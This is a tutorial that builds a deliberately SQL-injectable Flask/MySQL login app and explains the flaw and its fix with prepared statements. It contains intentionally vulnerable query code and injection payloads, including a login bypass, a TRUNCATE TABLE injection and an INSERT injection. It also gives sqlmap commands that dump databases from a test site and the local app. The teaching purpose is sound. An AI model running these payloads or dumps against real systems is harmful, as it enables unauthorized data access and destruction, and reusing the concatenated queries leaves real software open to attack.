Table Of Contents

Preface
Programs and Tools
	Python
	Microsoft Visual Studio
	MySQL
Preparation
	Database
	Running The Server
	Try It Out
Development
	main.py
	my_data.py
SQL Injection
	The Problem
	The Solution
Rest Client
	Manual Usage
	Auto Injection
SQLMAP
	Online Demonstration
	Project Demonstration


Preface

I created a simple webapplication designed to show off SQL Injection. To do this, I used the Python framework Flask and the database management system MySQL. If you want to follow along, basic knowledge of Python, Flask and SQL are
highly recommended.

The website contains two pages. One to register a new user and one to login as a registered user. The forms on these pages are designed to be SQL injectable, but i provide alternative code examples to show how to prevent these kinds of
injections.

Additionally, I created a rest client with which the webapplication can be navigated manually in a console window or automatically performs an SQL injection. At the end of this article, I also provide instructions on how to use SQLMAP.
A tool to detect SQL injection vulnerabilities and display data from the database you are not supposed be able to access.

This project is an expansion of the work from David Abderhalden.


Programs and Tools

	Python

Since I am writing the code for the webapplication in the Python programming language, I needed to download Python and install it. This is very straight forward. Just download the installer from python.org and install it. Make sure to
add Python to PATH, so you can execute Python commands from anywhere inside a command prompt window.

	Microsoft Visual Studio

To work on the project, I chose the integrated development environment Microsoft Visual Studio. The installer can be downloaded at visualstudio.microsoft.com. Go through the installation process and choose to install "Python
development" and ".NET desktop development". The latter of which is needed so the MySQL database management system can install additional tools that connect to Visual Studio. I make no use of these tools in this project but since I am
already installing both programs, I might aswell install these features for the future.

	MySQL

The MySQL installer can be downloaded at dev.mysql.com. It can install various Programs and Tools to work with the MySQL database management system. For reasons of simplicity, choose "Full" as the setup type and leave all options as is.
After the installation is complete, you need to choose a username and password. For the purpose of this practice, you can leave the username as "root" and set a simple password like "password".


Preparation

Since i had no prior experience with SQL and the Flask framework, I started by completing a Flask tutorial at flask.palletsprojects.com. With this, I learned the basics of how to develop a webapplication using Flask. After that, I
looked into MySQL using mysqltutorial.org and learned how to setup simple databases and manipulate the data within them. Additionally, I spent some time learning about the basic concept of the SQL injection vulnerability. For the next
step, I read through the article of David Abderhalden and downloaded his project at github.com. I followed his documentation to understand the code he wrote and comprehend his thought process. To run his webapplication, I needed to
setup my own database which would hold the information of the registered users.

	Database

To setup my own database, I used the MySQL Workbench application. Run the program and click "+" next to "MySQL Connections" to create a new connection. For the purpose of this practice, just give it a simple name like "SQL Injection
Practice" and leave all other options as their default. If you chose another username than "root" during the installation process, you might need to change the "Username" value to your username while creating the connection. You can
always right click on the connection afterwards and choose "Edit Connection" to change these settings. After creating the connection, you can open it by simply clicking on it and typing in the password you set during the installation.
If you want to, you can tick the box next to "Save password in vault" so you no longer need to type in your password everytime you open any connection with this user. Now, you can create a new schema and a table within it that stores
the usernames and passwords of the registered users. You can do this using the built in functions of MySQL Workbench or run a written query. The following query creates a schema called "sql_injection_practice" and a table within it
called "users" with the 3 attributes "user_id", "username" and "password". Copy the query into the query tab of MySQL Workbench and execute it by clicking the thunderbolt or using the keyboard shortcut Control+Shift+Enter.

Query 1

CREATE SCHEMA sql_injection_practice;
USE sql_injection_practice;
CREATE TABLE users (
    user_id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(20),
    password VARCHAR(20)
);

	Running The Server

If you downloaded my project, you are ready to try out the webapplication. Open the project in your integrated development environment of choice. If you set everything up as i described, the application should be working as is.
However, if you chose different names and values for some of the options, you need to adjust these in the code. Open the files "my_data.py" and "my_data_safe.py" and adjust the values of the variables in the following code with the
ones you set during the installation process of MySQL and the creation of the connection in MySQL Workbench.

my_data.py/my_data_safe.py

 6 my_database = mysql.connector.connect(
 7     host="127.0.0.1",
 8     user="root",
 9     password="password",
10     database="sql_injection_practice"
11     )

If you chose a different name for the table in the database or the attributes in said table, you need to go through the code and change these in the queries that MySQL executes. There are four in the file "my_data.py" at the lines
18, 31, 37 and 46 and four in the file "my_data_safe.py" at the lines 18, 33, 40 and 51. Do not change the "username" and "password" variables with a "+" on either side.

For example,

my_data.py

21 my_cursor.execute("SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "';")

becomes

my_data.py

21 my_cursor.execute("SELECT * FROM your_table_name WHERE your_username_name = '" + username + "' AND your_password_name = '" + password + "';")

To run the server, open a command prompt window or use one that is integrated in your development environment and navigate to the directory of the project where the files "main.py", "my_data.py", etc. are located. Type or copy the
following commands and execute them in the command prompt window. The first command activates the virtual environment in which the necessary pip libraries are installed. The second command tells Flask which file it should use to
initiate the webapplication and the third one starts the server.

Command Prompt

venv\scripts\activate
set FLASK_APP=main
flask run

	Try It Out

After starting the server, you can acces the website like any other using an internet browser. Open your browser of choice and enter the URL localhost:5000. This brings you to the login page of the webapplication. If this URL does not
work, check the command prompt window in which you started the server. It should display the URL of the webapplication on the last line in the following format.

Command Prompt

* Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)

Switch between the login and register page by clicking the "Register instead" and "Login instead" buttons. Registering a user adds their credentials to the database you set up earlier. If you try to log in using credentials that are
present in the database, a page is displayed that informs you of the succesful login. Refresh that page to get back to the login page. Clicking the "Truncate users table" button deletes all entries from the database. You can check the
content of the database at any time by executing the following query in a query tab of MySQL Workbench.

Query 2

USE sql_injection_practice;
SELECT * FROM users;


Development

After I wrapped my head around the code and concept of the original webapplication from David Abderhalden, I started to change and expand the project. I added a page to register new users directly on the website and implemented a lot
of improvements that enhance the user experience.

	main.py

main.py

 1 from flask import Flask, request, render_template, escape, redirect, url_for, send_from_directory, flash
 2 import os
 3
 4
 5 # import my_data or my_data_safe
 6 import my_data as data

In the first few lines of code, all the necessary methods, functions and libraries are imported. In the file "my_data.py", that gets imported on line 6, are all the functions included that execute SQL queries. The functions in that
file are designed to be vulnerable to SQL injection attacks while the same functions in the file "my_data_safe.py", that fundamentally execute the same queries, are not. This line provides an easy switch between the two versions by
replacing "my_data" with "my_data_safe" and vice versa.

main.py

 9 app = Flask(__name__)
10 app.secret_key = "my_secret_key"

On line 9, an instance of the Flask class is created. This is needed so that Flask knows where to look for resources such as templates and static files. On the next line, we set a secret key that is used to cryptographically sign the
cookies you send to a user.

main.py

13 # Main Route
14 @app.route('/')
15 def main():
16     return redirect(url_for('login'))

The "route" decorator of the Flask class is used to trigger the appropriate function when the URL specified as the argument is visited. In this case, visiting http://localhost:5000/ simply triggers a redirect to the login page at
http://localhost:5000/login.

main.py

19 # Login Route
20 @app.route('/login', methods=['POST', 'GET'])
21 def login():
22     if 'login' in request.form:
23         username = (request.form['username'])
24         password = (request.form['password'])
25         if data.login_checker(username, password):
26             return render_template('index.html', name=escape(username), passw=escape(password))
27         else:
28             flash("Login failed!")
29             return redirect(url_for('login'))
30     elif 'register_instead' in request.form:
31         return redirect(url_for('register'))
32     elif 'truncate_users_table' in request.form:
33         data.truncate_users_table()
34         flash("Table truncated!")
35         return redirect(url_for('login'))
36     else:
37         return render_template('login.html')

This is the function that gets triggered when visiting the login page at http://localhost:5000/login. The if-statements check whether the function was called by one of the "Login", "Register instead" or "Truncate users table" buttons
or none of them.

If no button was used, the code on line 37 runs and simply render and display the "login.html" file in the internet browser. If you downloaded the project, you can find all the html files in the templates directory.

In the case that the "Login" button was clicked, the code starting on line 23 runs. Firstly, it requests and saves the login credentials that the user typed into the form in the browser. Then, it checks with another if-statement and
the "login_checker" function from the "my_data.py" file whether the credentials are present in the database. The functions from the "my_data.py" file will be explained at a later time. The "login_checker" function returns "True" if
the credentials are present in the database and "False" if they are not. If the function returns "True" another html file called "index.html" is rendered and displayed that shows a message saying "Login succesful!". Otherwise, the page
is reloaded and a message stating "Login failed!" is flashed.

If the "Register instead" button was clicked, the page redirects the user to the register page.

Lastly, if the "Truncate users table" button was clicked, the "truncate_users_table" function from the "my_data.py" file is called. This function executes an SQL query to delete all data from the users table. Afterwards, it reloads the
page and flashes a message saying "Table truncated!".

main.py

40 # Register Route
41 @app.route('/register', methods=['POST', 'GET'])
42 def register():
43     if 'register' in request.form:
44         username = (request.form['username'])
45         password = (request.form['password'])
46         if data.register_checker(username, password):
47             flash("Register succesful!")
48             return redirect(url_for('login'))
49         else:
50             flash("Register failed!")
51             return redirect(url_for('register'))
52     elif 'login_instead' in request.form:
53         return redirect(url_for('login'))
54     elif 'truncate_users_table' in request.form:
55         data.truncate_users_table()
56         flash("Table truncated!")
57         return redirect(url_for('register'))
58     else:
59         return render_template('register.html')

This is the function that gets triggered when visiting the register page at http://localhost:5000/register. The structure is identical to the login page and should therefore be self explanatory. The "register_checker" function from the
"my_data.py" file returns "True" if the username is not already present in the database, contains at least one character and both the username and password are not longer than 20 characters. If that is the case, the credentials are
added to the database. Otherwise, it returns "False" and refuse to add the credentials to the databse.

main.py

62 # Route to favicon
63 @app.route('/favicon.ico')
64 def fav():
65     return send_from_directory(os.path.join(app.root_path, 'img'),'favicon.ico')

The last few lines are used to display the favicon on a page which is used by the html templates to display the icon next to the name of the page in the browser.

	my_data.py

my_data.py

 1 import mysql.connector
 2
 3
 4 # Connection to database
 5 def return_my_database_cursor():
 6     my_database = mysql.connector.connect(
 7                     host="127.0.0.1",
 8                     user="root",
 9                     password="password",
10                     database="sql_injection_practice"
11                     )
12    return my_database, my_database.cursor()

The first few lines are dedicated to a function that establishes a connection to the database where the credentials of the registered users are stored. It returns the connection and a cursor of the connection which is needed to execute
SQL queries in the connected database.

my_data.py

15 # Login injectable
16 def login_checker(username, password):
17     my_database, my_cursor = return_my_database_cursor()
18     my_cursor.execute("SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "';")
19     my_result = my_cursor.fetchall()
20    my_cursor.close()
21     my_database.close()
22     if len(my_result) > 0:
23         return True
24     return False

The "login_checker" function is called when the "Login" button is clicked and checks whether the credentials entered are present in the database. To do this, it executes an SQL query that returns all rows of the database that match the
username and password received as arguments. If any rows are returned, the function returns "True". Otherwise, it returns "False". The query on line 18 is precisely where the SQL injection vulnerability lies. Why that is and how to fix
it will be explained shortly.

my_data.py

26 # Register injectable
27 def register_checker(username, password):
28     if len(username) > 20 or len(password) > 20 or username == "":
29         return False
30     my_database, my_cursor = return_my_database_cursor()
31     my_cursor.execute("SELECT * FROM users WHERE username = '" + username + "';")
32     my_result = my_cursor.fetchall()
33     if len(my_result) > 0:
34         my_cursor.close()
35         my_database.close()
36         return False
37     my_cursor.execute("INSERT INTO users (username, password) VALUES ('" + username + "', '" + password + "');")
38     my_cursor.close()
39     my_database.commit()
40     my_database.close()
41     return True

The "register_checker" function is called when the "Register" button is clicked and checks whether the credentials entered are valid to be inserted into the database and insert them if they are. Firstly, it confirms that both username
and password received as arguments do not contain more than 20 characters and that the username is not empty. If any of these conditions are met, it returns "False". Then, similarly to the "login_checker" function, it checks with an
SQL query whether the username is already present in the database. If any rows are returned by the SQL query, it returns "False". Otherwise, it adds the credentials to the database using another SQL query and returns "True". The SQL
injection vulnerabilites lie again in the way that the SQL queries get executed on lines 31 and 37.

my_data.py

43 # Truncate users table
44 def truncate_users_table():
45     my_database, my_cursor = return_my_database_cursor()
46     my_cursor.execute("TRUNCATE TABLE users")
47     my_cursor.close()
48     my_database.close()

The "truncate_users_table" function is called when the "Truncate users table" button is clicked and simply deletes all entries of the database.


SQL Injection

An SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This means, it might allow an attacker to execute any unauthorized queries they wish on
databases the webapplication is connected to. This can lead to an attacker inserting and most importantly reading data from a database. This might include usernames, passwords, e-mail adresses, banking details, etc.

	The Problem

The functions of the "my_data.py" file concatenate the user input directly into the query before execution. Because of this, an attacker can influence the query with what he types into the login and register forms.

For example, by typing

' OR 1 = 1;--

as the username into the login form the query on line 18 of the "my_data.py" file 

SELECT * FROM users WHERE username = 'username' AND password = 'password';

becomes

SELECT * FROM users WHERE username = '' OR 1 = 1;--' AND password = 'password';

and since "1 = 1" is always "True", the query returns all rows of the database and the webapplication assumes the login was succesful.

As another example, by typing

'; TRUNCATE TABLE users;--

the query becomes

SELECT * FROM users WHERE username = ''; TRUNCATE TABLE users;--' AND password = 'password';

and therefore deletes all entries from the database.



Using this method, an attacker can pretty much execute any query he wants in the database connected to the webapplication.

	The Solution

To prevent this vulnerability, instead of concatenating the user input directly into the query, create a prepared statement with placeholders for the user input. Then, execute the query by providing the prepared statement together with
the user input as arguments to the cursor of the connection to the database.

To use this method in the functions from the "my_data.py" file, we firstly need to allow the "return_my_database_cursor" function to return a cursor with the prepared parameter set to "True".

my_data_safe.py

 4 # Connection to database
 5 def return_my_database_cursor(prepared=False):
 6     my_database = mysql.connector.connect(
 7                     host="127.0.0.1",
 8                     user="root",
 9                     password="password",
10                     database="sql_injection_practice"
11                     )
12     return my_database, my_database.cursor(prepared=prepared)

Now, if you want to execute a prepared statement, call the "return_my_database_cursor" function with the parameter "prepared" set to "True". Do this for the "login_checker" and "register_checker" functions. Afterwards, create two new
variables. One for the prepared statement and one for the credentials provided by the user. Then, execute the prepared statement with the credentials put in place by provding both as arguments to the "execute" method of the cursor.

In the end

my_data.py

17 my_database, my_cursor = return_my_database_cursor()
18 my_cursor.execute("SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "';")
19 my_result = my_cursor.fetchall()
20 my_cursor.close()

turned into

my_data_safe.py

17 my_database, my_cursor_prepared = return_my_database_cursor(prepared=True)
18 checker_query = "SELECT * FROM users WHERE username = %s AND password = %s;"
19 credentials = (username, password)
20 my_cursor_prepared.execute(checker_query, credentials)
21 my_result = my_cursor_prepared.fetchall()
22 my_cursor_prepared.close()

and

my_data.py

30 my_database, my_cursor = return_my_database_cursor()
31 my_cursor.execute("SELECT * FROM users WHERE username = '" + username + "';")
32 my_result = my_cursor.fetchall()
33 if len(my_result) > 0:
34     my_cursor.close()
35     my_database.close()
36     return False
37 my_cursor.execute("INSERT INTO users (username, password) VALUES ('" + username + "', '" + password + "');")
38 my_cursor.close()

turned into

my_data_safe.py

32 my_database, my_cursor_prepared = return_my_database_cursor(prepared=True)
33 checker_query = "Select * FROM users WHERE username = %s;"
34 my_cursor_prepared.execute(checker_query, [username])
35 my_result = my_cursor_prepared.fetchall()
36 if len(my_result) > 0:
37     my_cursor_prepared.close()
38     my_database.close()
39     return False
40 register_query = "INSERT INTO users (username, password) VALUES (%s, %s);"
41 credentials = (username, password)
42 my_cursor_prepared.execute(register_query, credentials)
43 my_cursor_prepared.close()


Rest Client

To navigate the webapplication using just a console window or automatically perform an SQL injection, I created a rest client. If you downloaded the project, you can run the rest client by opening the file "rest_client.py" and starting
it using your IDE or by navigating to the project directory within a command prompt window and using the following command.

Command Prompt

python rest_client.py

	Manual Usage

The rest client uses the "requests" library to send and receive data to and from the webserver run by Flask. First, it asks the user whether he wants to login, register or truncate the users table. The user can choose by typing the
corresponding letter and hitting enter.

Command Prompt

What do you want to do?
- Login (l)
- Register (r)
- Truncate users table (t)

If the user chooses to either login or register, he is asked to type in a username and a password. This is achieved by the following code.

rest_client.py

12 # user input
13 task = ''
14 while(task != 'l' and task != 'r' and task != 't' and not auto_inject):
15     task = input('What do you want to do?\n- Login (l)\n- Register (r)\n- Truncate users table (t)\n')
16 if(task == 'l' or task == 'r'):
17     username = input('USERNAME: ')
18     password = input('PASSWORD: ')

Based on the coice of the user, the rest client runs the appropriate code. If the user chose to login, the rest client sends a post request to the login page of the webserver with the payload containing the username and password that
the user typed in. Additionally, the payload contains an identifier that is technically used to tell whether the "Login", "Register instead" or "Truncate users table" button was clicked. Depending on the response from the webserver,
the rest client displays a suitable message. Since all the html files contain their name on the first line, whether the login attempt was succesful or not is figured out by checking the first line of the html template that is received
from the webserver. In case another unforeseen error occurs, the rest client displays a corresponging message. If the post request fails altogether, a message stating that no message was received from the wevserver is displayed. All of
this is achieved by the following code.

rest_client.py

21 if(task == 'l'):
22     try:
23         request = requests.post(url + '/login', data={'username': username, 'password': password, 'login': 'Login'})
24         if(request.text.splitlines()[0] == '<!--index-->'):
25             print('Login succesful!')
26         elif(request.text.splitlines()[0] == '<!--login-->'):
27             print('Login failed!')
28         else:
29             print('Error ' + str(request.status_code))
30     except(WindowsError):
31         print('No response from server!')

The code that runs when the user chooses to register or truncate the users table works fundamentally the same and should therefore be self explanatory. At the end, the rest client asks the user whether he wants to send another request.
If he chooses to do so, the rest client restarts from the beginning and asks the user again what he wants to do. Otherwise, the program simply ends.

	Auto Injection

The rest client provides the option to automatically perform an SQL injection within the username field of the login form. To do this, simply change the value of the "auto_inject" variable to "True" and choose the string that should be
sent as the username to the webserver using the variable "auto_injection". Afterwards, run the rest client. An example is provided that inserts a new row into the database with the username "injection" and the password "succesful".

rest_client.py

 6 auto_inject = False
 7 auto_injection = "'; INSERT INTO users (username, password) VALUES ('injection','succesful'); COMMIT;--"


SQLMAP

SQLMAP is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection vulnerabilities. You can download it at sqlmap.org. To use it, open a command prompt window and navigate to the
directory of your download or add the directory to PATH to execute SQLMAP commands from anywhere inside a command prompt window. By using the following command, the majority of useful parameters you can use with SQLMAP are displayed.

Command Prompt

python sqlmap.py -h

	Online Demonstration

The Website testphp.vulnweb.com is specifically designed with SQL injection vulnerabilities to showcase the effectiveness of SQLMAP. The following command runs some basic tests against one of its pages to find vulnerable points. During
testing, SQLMAP asks some questions based on what it finds. Just answer all of them with "y".

Command Prompt

python sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=1

The result looks something like this:

Command Prompt

sqlmap identified the following injection point(s) with a total of 48 HTTP(s) requests:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 9216=9216
 
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: cat=1 AND GTID_SUBSET(CONCAT(0x7170717171,(SELECT (ELT(4223=4223,1))),0x7176717a71),4223)
 
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: cat=1 AND (SELECT 1838 FROM (SELECT(SLEEP(5)))rEFg)
 
    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170717171,0x54614e7844414f787847635761784c595a6a707349776d7269784d42797150417452585452624645,0x7176717a71),NULL,NULL-- -
---
[00:00:00] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.19.0, PHP 5.6.40
back-end DBMS: MySQL >= 5.6
[00:00:00] [INFO] fetched data logged to text files under 'C:\Users\taagilu6\AppData\Local\sqlmap\output\testphp.vulnweb.com'

The most important thing is that it identified at least one injection point. This means, that the website has an SQL injection vulnerability that might be exploitable. The following command displays all the databases we can access using
this vulnerability.

Command Prompt

python sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 -dbs

In the result, you can find the names of the databases:

Command Prompt

[00:00:00] [INFO] fetching database names
available databases [2]:
[*] acuart
[*] information_schema

Now, you can keep on going until you find the actual data inside of a table. The following command displays all the tables inside of the "acuart" database.

Command Prompt

python sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -tables

In the result, you can find the names of the tables:

Command Prompt

[00:00:00] [INFO] fetching tables for database: 'acuart'
Database: acuart
[8 tables]
+-----------+
| artists   |
| carts     |
| categ     |
| featured  |
| guestbook |
| pictures  |
| products  |
| users     |
+-----------+

The following command displays all the columns inside of the "artists" table.

Command Prompt

python sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists -columns

In the result, you can find the names of the columns:

Command Prompt

[00:00:00] [INFO] fetching columns for table 'artists' in database 'acuart'
Database: acuart
Table: artists
[3 columns]
+-----------+-------------+
| Column    | Type        |
+-----------+-------------+
| adesc     | text        |
| aname     | varchar(50) |
| artist_id | int         |
+-----------+-------------+

Finally, the following command displays all the data inside of the "aname" column.

Command Prompt

python sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists -C aname --dump

In the result, you can find the data in the column:

Command Prompt

[00:00:00] [INFO] fetching entries of column(s) 'aname' for table 'artists' in database 'acuart'
Database: acuart
Table: artists
[3 entries]
+---------+
| aname   |
+---------+
| r4w8173 |
| Blad3   |
| lyzae   |
+---------+

	Project Demonstration

Pretty much the same procedure works for the webapplication of this project although there is one key difference. Since this webapplication uses a post request to get the data from the login and request forms, you need to provide some
dummy data to SQLMAP. This guarantees that the appropriate code, that executes the queries using the data, runs. Therefore, the following command performs some basic tests on the login form. The form data is provided using the parameter
"--data". Since the webapplication uses the name of the button that is clicked to run the appropriate code, you need to add that aswell.

Command Prompt

python sqlmap.py -u http://localhost:5000/login --data="username=dummy&password=dummy&login=Login"

Since you know exactly how the webapplication works, you can provide some additional parameters to speed up the process. Using the parameter "-p", SQLMAP tries to find SQL injection vulnerabilites only in the field provided. Since you
know that all fields are injectable in the same way, you can limit the testing to one of them. With the parameter "--dbms" you can tell SQLMAP which database management system the webapplication is connected to which in this case is
MySQL. With these adjustements the command for the basic test looks as follows.

Command Prompt

python sqlmap.py -u http://localhost:5000/login --data="username=dummy&password=dummy&login=Login" -p username --dbms=mysql

Now, you can perform the same steps as before until you reach the data of the users table or any other table in your database for that matter. The following command displays the usernames and passwords of all users present in the
database.

Command Prompt

python sqlmap.py -u http://localhost:5000/login --data="username=dummy&password=dummy&login=Login" -p username --dbms=mysql -D sql_injection_practice -T users --dump-all